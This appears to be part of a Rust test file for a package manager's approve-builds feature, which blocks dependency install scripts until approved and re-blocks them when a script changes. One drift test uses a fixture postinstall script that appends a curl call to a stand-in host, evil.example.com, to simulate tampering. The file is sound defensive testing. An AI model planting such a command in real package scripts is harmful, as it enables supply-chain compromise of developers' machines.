    // and re-running M3 to verify the suppression rule honors the new
    // approval. The actual `lpm build` script execution is out of scope
    // for unit tests (it spawns child processes); the strict gate that
    // M5 wires in is verified separately by the build.rs::tests::build_strict_gate_*
    // tests.
    //
    // The state machine cells we lock in:
    //   1. install ⇒ block (M3 alone)
    //   2. install ⇒ block ⇒ approve via --yes ⇒ install ⇒ silent
    //   3. install ⇒ block ⇒ approve specific pkg ⇒ install ⇒ silent
    //   4. install ⇒ block ⇒ approve ⇒ script body changes ⇒ install ⇒ re-blocked
    //   5. install with legacy array form ⇒ block ⇒ approve --yes ⇒ rich form
    //   6. install with no scriptable packages ⇒ no state, no warning

    use crate::build_state::{self, capture_blocked_set_after_install};
    use lpm_security::SecurityPolicy;
    use lpm_store::PackageStore;

    fn fake_store_with_pkg(
        store_root: &Path,
        name: &str,
        version: &str,
        scripts: &serde_json::Value,
    ) {
        let safe = name.replace('/', "+");
        let pkg_dir = store_root.join("v1").join(format!("{safe}@{version}"));
        fs::create_dir_all(&pkg_dir).unwrap();
        let pkg = serde_json::json!({
            "name": name,
            "version": version,
            "scripts": scripts,
        });
        fs::write(
            pkg_dir.join("package.json"),
            serde_json::to_string_pretty(&pkg).unwrap(),
        )
        .unwrap();
    }

    fn read_policy(project_dir: &Path) -> SecurityPolicy {
        SecurityPolicy::from_package_json(&project_dir.join("package.json"))
    }

    #[tokio::test]
    async fn e2e_install_block_review_approve_yes_then_install_is_silent() {
        // The canonical happy path: blocked → approve --yes → silent.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];

        // (1) First install ⇒ blocked, warning emitted
        let cap1 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap1.should_emit_warning);
        assert_eq!(cap1.state.blocked_packages.len(), 1);

        // (2) Approve via --yes
        run(project.path(), None, true, false, true).await.unwrap();
        let manifest = read_manifest(&project.path().join("package.json"));
        assert!(
            manifest["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object(),
            "yes mode must write the rich entry"
        );

        // (3) Re-run install with the new policy ⇒ silent
        let cap2 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(
            cap2.all_clear_banner || !cap2.should_emit_warning,
            "post-approval install should be silent or emit the all-clear banner"
        );
        assert!(cap2.state.blocked_packages.is_empty());

        // (4) A SECOND post-approval install should also be silent (no
        // repeated all-clear banner).
        let cap3 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(
            !cap3.should_emit_warning,
            "second post-approval install must be silent (no banner spam)"
        );
    }

    #[tokio::test]
    async fn e2e_install_block_approve_specific_then_install_is_silent() {
        // Same as the --yes flow but using `<pkg>` for a single approval.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];

        let cap1 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap1.should_emit_warning);

        // Approve esbuild specifically (json_output=true bypasses TTY confirm)
        run(project.path(), Some("esbuild"), false, false, true)
            .await
            .unwrap();

        let cap2 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap2.state.blocked_packages.is_empty());
    }

    #[tokio::test]
    async fn e2e_install_block_approve_then_script_drift_re_blocks() {
        // The CRITICAL invariant — script_hash binding actually catches
        // post-approval drift. Approve, then mutate the script in the
        // store, then re-run install: package re-blocked with binding_drift = true.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];

        let _ = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        run(project.path(), None, true, false, true).await.unwrap();

        // Sanity: post-approval install is silent
        let cap_post_approve = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap_post_approve.state.blocked_packages.is_empty());

        // Now mutate the script body in the store (simulates a tarball
        // swap or maintainer-pushed hotfix to the same version)
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js && curl evil.example.com"}),
        );

        // Re-run install ⇒ esbuild MUST be re-blocked with drift flag
        let cap_drift = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(
            cap_drift.should_emit_warning,
            "drift must re-emit the warning"
        );
        assert_eq!(cap_drift.state.blocked_packages.len(), 1);
        assert!(
            cap_drift.state.blocked_packages[0].binding_drift,
            "drifted package must be flagged with binding_drift = true"
        );
    }

    #[tokio::test]
    async fn e2e_install_with_legacy_array_form_does_not_break_install() {
        // Backwards-compat: a project with the pre-Phase-4 legacy array
        // form must still install. The strict gate sees LegacyNameOnly
        // for the listed package and treats it as approved (with a
        // deprecation warning at build time, but install is fine).
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_manifest(
            &project.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": ["esbuild"],
                },
            }),
        );
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );

        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[(
                "esbuild".to_string(),
                "0.25.1".to_string(),
                Some("sha512-x".to_string()),
            )],
            &read_policy(project.path()),
        )
        .unwrap();

        // Legacy bare-name approval is enough to NOT block — install
        // proceeds silently. The deprecation warning is emitted at
        // `lpm build` time (M5), not here.
        assert!(cap.state.blocked_packages.is_empty());
        assert!(!cap.should_emit_warning);
    }

    #[tokio::test]
    async fn e2e_install_with_legacy_then_approve_yes_upgrades_to_rich() {
        // Migration path: project starts with the legacy array form, a
        // NEW package gets installed that needs approval, --yes upgrades
        // the manifest to the rich form AND preserves the existing legacy
        // entries.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_manifest(
            &project.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": ["sharp"],
                },
            }),
        );
        // sharp is approved (legacy), esbuild is NOT
        fake_store_with_pkg(
            store_root.path(),
            "sharp",
            "0.33.0",
            &serde_json::json!({"install": "node-gyp rebuild"}),
        );
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![
            ("sharp".to_string(), "0.33.0".to_string(), None),
            ("esbuild".to_string(), "0.25.1".to_string(), None),
        ];
        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        // Only esbuild is blocked (sharp is legacy-approved)
        assert_eq!(cap.state.blocked_packages.len(), 1);
        assert_eq!(cap.state.blocked_packages[0].name, "esbuild");

        // Bulk approve
        run(project.path(), None, true, false, true).await.unwrap();

        // Manifest is now Rich form with BOTH entries
        let manifest = read_manifest(&project.path().join("package.json"));
        let td = &manifest["lpm"]["trustedDependencies"];
        assert!(td.is_object(), "must be Rich form after first approval");
        let map = td.as_object().unwrap();
        assert!(map.contains_key("esbuild@0.25.1"), "new approval");
        assert!(
            map.contains_key("sharp@*"),
            "legacy entry preserved as `<name>@*`"
        );

        // Lenient lookup still finds sharp via the @* sentinel — install
        // continues to honor it for the legacy use case.
        let policy_after = read_policy(project.path());
        assert!(policy_after.can_run_scripts("sharp"));
    }

    #[tokio::test]
    async fn e2e_install_with_no_scriptable_packages_no_state_no_warning() {
        // Defensive: a project that installs only packages with no install
        // scripts must not emit any banner.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "lodash",
            "4.17.21",
            &serde_json::json!({}),
        );

        let cap = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[("lodash".to_string(), "4.17.21".to_string(), None)],
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap.state.blocked_packages.is_empty());
        assert!(!cap.should_emit_warning);
        // State file is still written (so future installs share the same
        // empty fingerprint), but no warning fired.
        assert!(build_state::read_build_state(project.path()).is_some());
    }

    // ── Phase 4 audit Finding 2 — filter persisted state through current trust ──
    //
    // The persisted build-state.json is only refreshed by `lpm install`. If
    // the user approves a package via `lpm approve-builds` and then runs
    // `--list` or `--yes` again WITHOUT re-installing, the helper must
    // recompute "is this still blocked?" against the CURRENT manifest, not
    // against the stale state file. Pre-fix the state was treated as
    // authoritative and already-approved packages re-appeared in --list.

    // ── Effective blocked set helper (Phase 4 D-impl-2 surgical primitive) ──
    //
    // The pure helper that filters the persisted state through the current
    // trust. Tested directly because reaching it through the `run` function
    // pollutes stdout with TUI / JSON formatting and makes assertions noisy.

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** filter must REMOVE entries
    /// covered by a Strict match in the current trustedDependencies.
    #[test]
    fn compute_effective_blocked_set_removes_strict_matches() {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "2026-04-11T00:00:00Z".into(),
            blocked_packages: vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        };
        // esbuild approved strictly, sharp not.
        let mut map = std::collections::HashMap::new();
        map.insert(
            "esbuild@0.25.1".to_string(),
            TrustedDependencyBinding {
                integrity: Some("sha512-esbuild-integrity".into()),
                script_hash: Some("sha256-esbuild-hash".into()),
            },
        );
        let trusted = TrustedDependencies::Rich(map);

        let effective = compute_effective_blocked_set(&state, &trusted);
        assert_eq!(effective.len(), 1);
        assert_eq!(effective[0].name, "sharp");
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** filter must REMOVE entries
    /// covered by a LegacyNameOnly match (the legacy bare-name approval is
    /// honored at install time, so it's not "blocked").
    #[test]
    fn compute_effective_blocked_set_removes_legacy_name_only_matches() {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "2026-04-11T00:00:00Z".into(),
            blocked_packages: vec![make_blocked("esbuild", "0.25.1")],
        };
        let trusted = TrustedDependencies::Legacy(vec!["esbuild".into()]);

        let effective = compute_effective_blocked_set(&state, &trusted);
        assert!(
            effective.is_empty(),
            "legacy bare-name approval must be honored as 'not blocked'"
        );
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** drifted entries must
    /// REMAIN in the effective blocked set even when the manifest has
    /// an entry for the same `name@version`. Drift is the whole reason
    /// we re-review.
    #[test]
    fn compute_effective_blocked_set_keeps_drifted_entries() {
        let mut blocked = make_blocked("esbuild", "0.25.1");
        blocked.script_hash = Some("sha256-NEW".to_string()); // drifted from stored
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "2026-04-11T00:00:00Z".into(),
            blocked_packages: vec![blocked],
        };
        let mut map = std::collections::HashMap::new();
        map.insert(
            "esbuild@0.25.1".to_string(),
            TrustedDependencyBinding {
                integrity: Some("sha512-esbuild-integrity".into()),
                script_hash: Some("sha256-OLD".into()),
            },
        );
        let trusted = TrustedDependencies::Rich(map);

        let effective = compute_effective_blocked_set(&state, &trusted);
        assert_eq!(
            effective.len(),
            1,
            "drifted entry must STAY in the effective blocked set"
        );
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** unrelated entries are
    /// untouched (NotTrusted entries always stay blocked).
    #[test]
    fn compute_effective_blocked_set_keeps_not_trusted_entries() {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "2026-04-11T00:00:00Z".into(),
            blocked_packages: vec![make_blocked("esbuild", "0.25.1")],
        };
        let trusted = TrustedDependencies::default();
        let effective = compute_effective_blocked_set(&state, &trusted);
        assert_eq!(effective.len(), 1);
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-1 + D-impl-2 interaction):**
    /// after a legacy upgrade, an `<name>@*` preserve key must be
    /// honored by the effective-blocked-set filter. This is the
    /// composition test for both fixes.
    #[test]
    fn compute_effective_blocked_set_honors_at_star_preserve_key() {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".into(),
            captured_at: "2026-04-11T00:00:00Z".into(),
            blocked_packages: vec![make_blocked("esbuild", "0.25.1")],
        };
        // Simulate post-upgrade state: legacy esbuild → esbuild@*
        let mut td = TrustedDependencies::Legacy(vec!["esbuild".into()]);
        td.upgrade_to_rich();

        let effective = compute_effective_blocked_set(&state, &td);
        assert!(
            effective.is_empty(),
            "after legacy upgrade, esbuild@* preserve key must satisfy the filter"
        );
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** `--list` must NOT include
    /// any package that the current `package.json::lpm.trustedDependencies`
    /// already covers strictly.
    #[tokio::test]
    async fn approve_builds_list_filters_already_approved_packages_from_current_trust() {
        let dir = tempdir().unwrap();
        // The state file says esbuild is blocked
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        // But the manifest already has a strict approval that matches the
        // exact integrity + script_hash from the state file.
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-esbuild-hash"
                        }
                    }
                }
            }),
        );

        // --list mode should print "nothing to approve" because esbuild
        // is already strict-approved. Pre-fix this would have shown
        // esbuild as blocked.
        run(dir.path(), None, false, true, true).await.unwrap();

        // Sanity: the state file is unchanged (--list is read-only)
        let state = build_state::read_build_state(dir.path()).unwrap();
        assert_eq!(state.blocked_packages.len(), 1);
        // The fix is in the rendering, not in the state file.
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** `--yes` must skip already-approved
    /// packages and not re-write them.
    #[tokio::test]
    async fn approve_builds_yes_skips_packages_already_strict_approved_in_manifest() {
        let dir = tempdir().unwrap();
        write_state(
            dir.path(),
            vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        );
        // esbuild is already strict-approved; sharp is not.
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-esbuild-hash"
                        }
                    }
                }
            }),
        );

        // --yes should approve ONLY sharp (esbuild is already strict-trusted)
        run(dir.path(), None, true, false, true).await.unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let map = after["lpm"]["trustedDependencies"]
            .as_object()
            .expect("Rich form");
        assert!(map.contains_key("esbuild@0.25.1"), "esbuild preserved");
        assert!(map.contains_key("sharp@0.33.0"), "sharp newly approved");
        // The esbuild binding must NOT have been re-written from the
        // state file (which would be a no-op overwrite, but we want the
        // helper to skip already-approved entries entirely).
        assert_eq!(
            map["esbuild@0.25.1"]["integrity"],
            "sha512-esbuild-integrity",
            "esbuild binding preserved unchanged"
        );
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** `<pkg>` must reject a package
    /// argument that points at an already-approved entry, with a clear
    /// "already approved" message rather than a useless re-approval.
    #[tokio::test]
    async fn approve_builds_specific_pkg_for_already_approved_is_a_no_op_with_message() {
        let dir = tempdir().unwrap();
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-esbuild-hash"
                        }
                    }
                }
            }),
        );

        // Asking to approve esbuild specifically should error with
        // "already approved", NOT silently re-write the entry.
        let err = run(dir.path(), Some("esbuild"), false, false, true)
            .await
            .unwrap_err();
        let msg = err.to_string();
        assert!(
            msg.contains("already approved"),
            "expected an 'already approved' message, got: {msg}"
        );
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** if EVERY package in the
    /// persisted state is already approved, `--list` should report nothing
    /// to approve (empty effective blocked set), not the stale entries.
    #[tokio::test]
    async fn approve_builds_list_reports_nothing_when_all_persisted_blocked_are_already_approved()
    {
        let dir = tempdir().unwrap();
        write_state(
            dir.path(),
            vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        );
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-esbuild-hash"
                        },
                        "sharp@0.33.0": {
                            "integrity": "sha512-sharp-integrity",
                            "scriptHash": "sha256-sharp-hash"
                        }
                    }
                }
            }),
        );

        run(dir.path(), None, false, true, true).await.unwrap();

        // The package.json must be byte-identical (no rewrite happened)
        let after = read_manifest(&dir.path().join("package.json"));
        assert_eq!(
            after["lpm"]["trustedDependencies"]
                .as_object()
                .unwrap()
                .len(),
            2
        );
    }

    /// **AUDIT REGRESSION (Phase 4 D-impl-2):** drift overrides "already approved".
    /// If the persisted state shows a script_hash that drifts from the
    /// stored binding, the package MUST appear in the effective blocked
    /// set (this is the whole point of script-hash binding).
    #[tokio::test]
    async fn approve_builds_yes_does_not_skip_packages_with_binding_drift() {
        let dir = tempdir().unwrap();
        // State file claims script_hash = sha256-NEW
        let mut blocked = make_blocked("esbuild", "0.25.1");
        blocked.script_hash = Some("sha256-NEW".to_string());
        blocked.binding_drift = true;
        write_state(dir.path(), vec![blocked]);

        // Manifest has the OLD binding
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": {
                        "esbuild@0.25.1": {
                            "integrity": "sha512-esbuild-integrity",
                            "scriptHash": "sha256-OLD"
                        }
                    }
                }
            }),
        );

        // --yes should re-approve esbuild with the NEW script_hash from
        // the state file because the binding drifted.
        run(dir.path(), None, true, false, true).await.unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let binding = &after["lpm"]["trustedDependencies"]["esbuild@0.25.1"];
        assert_eq!(
            binding["scriptHash"], "sha256-NEW",
            "drift must trigger re-approval with the new script hash"
        );
    }

    // ── Phase 4 audit Finding 3 — --json mode emits exactly one JSON payload ──
    //
    // The bug: emit_yes_warning_banner unconditionally calls tracing::warn!,
    // and the tracing subscriber in main.rs writes to stdout (no
    // .with_writer(stderr) configured). So a `--yes --json` invocation
    // produces a WARN line on stdout BEFORE the JSON object, breaking any
    // downstream JSON.parse.
    //
    // We can't easily intercept tracing output from a unit test (the
    // global subscriber is set once per process), so the unit-level
    // regression here just verifies the BEHAVIOR contract: in JSON mode,
    // emit_yes_warning_banner must NOT call tracing::warn! / println!.
    // The CLI-level test (driving the binary as a subprocess) is the
    // end-to-end gate — see lpm-cli/tests/approve_builds_cli.rs.

    #[tokio::test]
    async fn approve_builds_yes_json_emits_warning_only_in_json_warnings_field() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        // --yes --json — verify the manifest mutation lands AND the
        // structured warning is in the JSON warnings array. The full
        // stdout-purity test is at the CLI level (subprocess capture).
        run(dir.path(), None, true, false, true).await.unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        assert!(after["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object());
        // The function should have completed without panicking. The
        // CLI-level subprocess test verifies the stdout layer.
    }
}
